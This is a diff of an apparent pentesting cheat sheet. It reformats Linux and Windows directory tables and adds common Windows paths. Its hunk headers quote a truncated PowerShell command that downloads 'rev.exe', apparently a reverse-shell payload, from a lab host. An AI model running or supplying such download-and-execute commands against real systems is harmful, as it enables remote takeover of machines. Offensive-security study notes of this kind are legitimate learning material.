@@ -163,7 +163,7 @@ powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' 
 
 ## Operating Systems
 
-## Linux
+### Linux
 
 | Directory | Description                                                                            |
 |-----------|----------------------------------------------------------------------------------------|
@@ -185,9 +185,18 @@ powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' 
 | /tmp      | Contains temporary files that can be used by applications.                             |
 | /usr      | Contains read-only user data, including binaries, libraries, and documentation.        |
 | /var      | Contains variable data, such as logs, databases, and mail.                             |u
-## Windows 
 
-> Common Hackable components
+### Windows 
 
-Writable Path for Windows
-`C:\Windows\Temp`
+| Directory              | Description                                                                         |
+|------------------------|-------------------------------------------------------------------------------------|
+| C:\                    | The root directory, the top-level directory in the filesystem.                      |
+| C:\Program Files       | Contains application software installed for all users.                              |
+| C:\Program Files (x86) | Contains 32-bit application software on 64-bit systems.                             |
+| C:\ProgramData         | Contains application data shared by all users.                                      |
+| C:\Users               | Contains user profiles, including Documents, Downloads, and other personal folders. |
+| C:\Windows             | Contains the Windows operating system files.                                        |
+| C:\Windows\System32    | Contains essential system files, including executables, DLLs, and drivers.          |
+| C:\Windows\SysWOW64    | Contains 32-bit system files on 64-bit systems.                                     |
+| C:\Windows\Temp        | Contains temporary files that can be used by applications and the system.           |
+
